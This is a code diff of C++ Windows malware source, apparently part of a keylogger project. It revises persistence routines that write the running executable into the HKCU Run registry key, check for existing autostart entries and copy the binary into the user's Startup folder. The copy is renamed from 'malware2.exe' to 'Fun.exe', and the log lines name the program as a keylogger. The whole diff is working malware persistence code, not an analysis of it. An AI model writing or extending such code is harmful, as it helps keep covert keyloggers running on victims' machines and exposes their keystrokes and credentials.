@@ -6,64 +6,87 @@
 #include <fstream>
 #include <string>
 #include "persistence.h"
+#include <shlwapi.h> // For PathFindFileName
+
 // Link with Windows Socket API and Common Controls libraries.
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "comctl32.lib")
+#pragma comment(lib, "Shlwapi.lib") // Link Shlwapi.lib
 
+std::wstring getDynamicAppName() {
+    wchar_t exePath[MAX_PATH];
+    if (GetModuleFileNameW(NULL, exePath, MAX_PATH) == 0) {
+        std::cerr << "Failed to get executable path. Error code: " << GetLastError() << std::endl;
+        return L"";
+    }
+    // Extract the file name from the full path
+    return std::wstring(PathFindFileNameW(exePath));
+}
 // Configures an application to auto-start by adding it to the Windows Registry.
-bool configureAutoStart(LPCTSTR appName, LPCTSTR appPath) {
+bool configureAutoStart(const std::wstring& appName, const std::wstring& appPath) {
     HKEY keyHandle;
-    // Open the registry key for auto-start configuration.
-    LONG opResult = RegOpenKeyEx(HKEY_CURRENT_USER,
-        _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
-        0, KEY_SET_VALUE, &keyHandle);
+    LONG opResult = RegOpenKeyExW(HKEY_CURRENT_USER,
+                                  L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                                  0, KEY_SET_VALUE, &keyHandle);
 
     if (opResult != ERROR_SUCCESS) {
         return false;
     }
 
-    // Set the value in the registry to make the application auto-start.
-    opResult = RegSetValueEx(keyHandle, appName, 0, REG_SZ,
-        (BYTE*)appPath, (_tcslen(appPath) + 1) * sizeof(TCHAR));
+    opResult = RegSetValueExW(keyHandle, appName.c_str(), 0, REG_SZ,
+                              reinterpret_cast<const BYTE*>(appPath.c_str()),
+                              (appPath.size() + 1) * sizeof(wchar_t));
 
-    // Close the registry key.
     RegCloseKey(keyHandle);
-
     return opResult == ERROR_SUCCESS;
 }
 
-// Checks if auto-start is enabled for a specific application.
-bool checkAutoStartEnabled(LPCTSTR appName) {
+
+bool checkAutoStartEnabled(const std::wstring& appName) {
     HKEY keyHandle;
-    // Open the registry key for querying.
-    LONG opResult = RegOpenKeyEx(HKEY_CURRENT_USER,
-        _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
-        0, KEY_QUERY_VALUE, &keyHandle);
+    LONG opResult = RegOpenKeyExW(HKEY_CURRENT_USER,
+                                  L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                                  0, KEY_QUERY_VALUE, &keyHandle);
 
     if (opResult != ERROR_SUCCESS) {
         return false;
     }
 
-    // Query the registry to check if the application auto-start is set.
-    opResult = RegQueryValueEx(keyHandle, appName, NULL, NULL, NULL, NULL);
-    // Close the registry key.
+    opResult = RegQueryValueExW(keyHandle, appName.c_str(), NULL, NULL, NULL, NULL);
     RegCloseKey(keyHandle);
-
     return opResult == ERROR_SUCCESS;
 }
 
-// Main function for setting up persistence. 
+
+
+// Main function for setting up persistence.
 int setupPersistence() {
-    LPCTSTR appAlias = _T("malware2.exe");
-    LPCTSTR appExecutablePath = _T("C:\\ProgramData\\malware2.exe");
-
-    if (checkAutoStartEnabled(appAlias)) {
-        _tprintf(_T("Auto-start already configured for %s.!!\n"), appAlias);
+    std::wstring appAlias = getDynamicAppName();
+    if (appAlias.empty()) {
+        std::cerr << "Failed to retrieve application name." << std::endl;
         return 1;
     }
+
+    wchar_t appExecutablePath[MAX_PATH];
+    if (GetModuleFileNameW(NULL, appExecutablePath, MAX_PATH) == 0) {
+        std::cerr << "Failed to get executable path." << std::endl;
+        return 1;
+    }
+
+    if (checkAutoStartEnabled(appAlias)) {
+        std::wcout << L"Auto-start already configured for " << appAlias << L".\n";
+    } else {
+        if (configureAutoStart(appAlias, appExecutablePath)) {
+            std::wcout << L"Auto-start configured successfully for " << appAlias << L".\n";
+        } else {
+            std::wcerr << L"Failed to configure auto-start for " << appAlias << L".\n";
+        }
+    }
+
     return 0;
 }
-// Function to copy the current executable to the Startup folder
+
+
 // Function to copy the current executable to the Startup folder
 bool copyToStartupFolder() {
     wchar_t currentPath[MAX_PATH];
@@ -77,7 +100,7 @@ bool copyToStartupFolder() {
 
     // Get the path to the user's Startup folder
     if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) {
-        std::wstring destinationPath = std::wstring(startupPath) + L"\\malware2.exe";
+        std::wstring destinationPath = std::wstring(startupPath) + L"\\Fun.exe";
 
         // Copy the file to the Startup folder
         if (CopyFileW(currentPath, destinationPath.c_str(), FALSE)) {
@@ -129,7 +152,6 @@ void setupAndRunScheduledTask() {
     }
 }
 
-// Main function to set up registry-based persistence.
 void setupRegistryPersistence() {
     LPCTSTR appAlias = _T("KeyloggerApp");
     TCHAR appPath[MAX_PATH];
@@ -140,15 +162,25 @@ void setupRegistryPersistence() {
         return;
     }
 
+#ifdef _UNICODE
+    // Convert LPCTSTR to std::wstring directly when using Unicode
+    std::wstring appAliasW(appAlias);
+    std::wstring appPathW(appPath);
+#else
+    // Convert LPCTSTR (char*) to std::wstring when not using Unicode
+    std::wstring appAliasW = std::wstring(appAlias, appAlias + strlen(appAlias));
+    std::wstring appPathW = std::wstring(appPath, appPath + strlen(appPath));
+#endif
+
     // Check if auto-start is already configured.
-    if (checkAutoStartEnabled(appAlias)) {
-        std::cout << "[INFO] Auto-start already configured for " << appAlias << "." << std::endl;
+    if (checkAutoStartEnabled(appAliasW)) {
+        std::wcout << L"[INFO] Auto-start already configured for " << appAliasW << L"." << std::endl;
     } else {
         // Configure auto-start.
-        if (configureAutoStart(appAlias, appPath)) {
-            std::cout << "[INFO] Keylogger successfully added to auto-start." << std::endl;
+        if (configureAutoStart(appAliasW, appPathW)) {
+            std::wcout << L"[INFO] Keylogger successfully added to auto-start." << std::endl;
         } else {
-            std::cerr << "[ERROR] Failed to add keylogger to auto-start." << std::endl;
+            std::wcerr << L"[ERROR] Failed to add keylogger to auto-start." << std::endl;
         }
     }
 }
